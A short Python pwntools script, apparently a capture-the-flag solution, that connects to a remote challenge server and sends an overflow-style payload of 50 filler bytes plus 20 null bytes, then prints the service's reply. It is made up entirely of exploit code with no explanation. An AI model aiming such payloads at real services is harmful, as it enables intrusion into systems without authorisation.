#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11006

yuan = remote(host,port)

payload = "a" *  50 + chr(0) * 20

yuan.sendline(payload)
yuan.sendline("a"*50)
print yuan.recvall()
#yuan.interactive()
